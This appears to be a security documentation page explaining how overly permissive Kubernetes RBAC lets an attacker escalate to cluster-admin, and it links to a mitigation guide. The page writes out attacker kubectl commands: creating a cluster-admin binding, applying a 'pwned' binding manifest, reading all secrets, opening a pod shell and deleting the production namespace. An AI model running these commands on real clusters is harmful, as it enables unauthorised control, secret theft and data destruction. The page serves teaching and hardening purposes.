---
sidebar_position: 8
title: "Insecure RBAC Permissions"
description: "How overly permissive Kubernetes RBAC configurations enable privilege escalation and full cluster compromise."
---

# Insecure RBAC Permissions

Kubernetes uses **Role-Based Access Control (RBAC)** to manage who can perform which actions on which resources. When RBAC is misconfigured—especially with **wildcard permissions**, **cluster-wide bindings**, or **unscoped roles**—an attacker can gain unauthorized access or escalate privileges to compromise the cluster.

---

## Exploitation Steps: Privilege Escalation via RBAC

An attacker leverages excessive RBAC permissions to escalate privileges and gain administrative control over the cluster.

### Step 1: Identify RBAC Roles and Bindings

The attacker inspects roles, cluster roles, and their bindings using a compromised pod or low-privileged user account:

```bash
kubectl get roles,rolebindings,clusterroles,clusterrolebindings -A
```

They search for any role or binding that includes excessive permissions or wildcards (`*`).

### Step 2: Check Impersonation Privileges

The attacker tests if they can impersonate other users—especially administrators:

```bash
kubectl auth can-i '*' '*' --as=admin
```

If the response is `yes`, they can act as an admin user.

### Step 3: Bind to Cluster Admin Role

If the attacker has permission to bind roles, they can bind themselves to the powerful `cluster-admin` role:

```bash
kubectl create clusterrolebinding attacker-admin \
  --clusterrole=cluster-admin \
  --user=attacker
```

Alternatively, they may discover an existing binding like this:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pwned-cluster-admin
subjects:
  - kind: User
    name: admin
    apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

Apply it using:

```bash
kubectl apply -f pwned-cluster-admin.yaml
```

### Step 4: Gain Full Access

With `cluster-admin` privileges, the attacker can now:

```bash
kubectl get secrets -A
kubectl exec -it <pod-name> -- /bin/sh
kubectl delete namespace production
```

They effectively control the entire cluster.

---

## Summary

RBAC misconfigurations—such as **wildcard permissions**, **unscoped bindings**, and **overly privileged roles**—can be exploited by attackers to gain full administrative access to Kubernetes clusters. These mistakes are often present in development or poorly hardened environments, making RBAC a prime target for lateral movement and privilege escalation.

➡ [See Mitigation Guide for Insecure RBAC Permissions](/docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/insecure_rbac_permissions_mitigation)
